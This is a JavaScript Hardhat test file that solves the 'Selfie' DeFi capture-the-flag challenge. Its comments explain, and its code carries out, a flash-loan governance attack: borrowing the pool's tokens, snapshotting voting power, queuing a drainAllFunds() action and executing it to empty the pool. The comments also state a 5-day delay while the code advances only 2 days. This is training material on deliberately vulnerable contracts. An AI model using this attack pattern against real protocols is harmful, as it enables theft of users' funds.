const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Selfie', function () {
    let deployer, player;
    let token, governance, pool;

    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token Snapshot
        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
        expect(await governance.getActionCounter()).to.eq(1);

        // Deploy the pool
        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
            token.address,
            governance.address    
        );
        expect(await pool.token()).to.eq(token.address);
        expect(await pool.governance()).to.eq(governance.address);
        
        // Fund the pool
        await token.transfer(pool.address, TOKENS_IN_POOL);
        await token.snapshot();
        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
        expect(await pool.flashFee(token.address, 0)).to.eq(0);

    });

    /**
     * @dev
     * Exploit Overview
     * 
     * This exploit works but again leveraging a flash loan to temporarily
     * increase our ownership in the DVT token to > 50% so that we can 
     * schedule an action to execute.
     * 
     * Since anyone can execute a snapshot() on the token, we can run this just
     * after running collecting the loan and just before running schedule action.
     * 
     * The action that we schedule is to drainAllFunds() to the attacker account
     * from the lending pool. This can only be called by the governance contract
     * which is fine since we are scheduling the action!
     * 
     * So the exploit goes
     * 
     * 1. Deploy SC
     * 2. Run attack() function which requests a flash loan from the pool with the entire amount
     * 3. SC receives flash loan amount
     * 4. SC requests a snapshot of the ERC20 token
     * 5. SC queues action to drainAllFunds() with >50% token balance (at the time)
     * 6. SC Returns funds to lending pool
     * 7. Wait waiting period of 5 days
     * 8. Attacker runs execute action on action ID (ID is tracked in the contract and starts with 1)
     * 9. Funds are transferred to the attacker.
     * 
     * Exploit contract is available at:
     * "contracts/attacker-contracts/AttackSelfie.sol"
     */
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const AttackFactory = await ethers.getContractFactory("AttackSelfie", player);
        const attackContract = await AttackFactory.deploy(pool.address, token.address, player.address);

        await attackContract.attack();
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days

        const attackGovernenceContract = governance.connect(player);
        await attackGovernenceContract.executeAction(1);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal(0);
    });
});